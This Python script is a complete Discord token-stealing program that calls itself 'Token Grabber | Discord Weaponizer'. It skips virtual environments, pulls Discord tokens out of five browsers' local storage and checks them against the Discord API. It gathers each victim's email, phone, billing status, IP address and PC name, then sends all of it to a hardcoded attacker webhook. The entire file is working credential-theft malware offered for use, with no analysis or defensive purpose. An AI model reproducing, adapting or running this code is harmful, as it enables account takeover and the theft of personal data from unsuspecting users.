import os
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
import sys
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

# VM skip
def get_base_prefix_compat(): # define all of the checks
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

def in_virtualenv(): 
    return get_base_prefix_compat() != sys.prefix

if in_virtualenv() == True: # if we are in a vm
    os._exit(0) # exit
    
PATHS = {
    "Opera GX"          : ROAMING + "\\Opera Software\\Opera GX Stable",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    try:
        for file_name in os.listdir(path):
            try:
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
            except:
                continue
    except:
        pass
    return tokens
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass
def main():
    cache_path = ROAMING + "\\.cache~$"
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "**Account Info**",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info**",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {
                
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Token Grabber | Discord Weaponizer",
        "avatar_url": "https://cdn.discordapp.com/avatars/928619303257923635/2101f61a8d6b468698893cb0d8677a15.webp?size=4096"
    }
    try:
        urlopen(Request("https://discord.com/api/webhooks/951684451870580776/IIOjaJUQfea12gJo9a2WBiw7J2RbhEr8crQq8r5-TC8xjsGjBx7Gq9t4vZHY6ZoT_mgr", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass

main()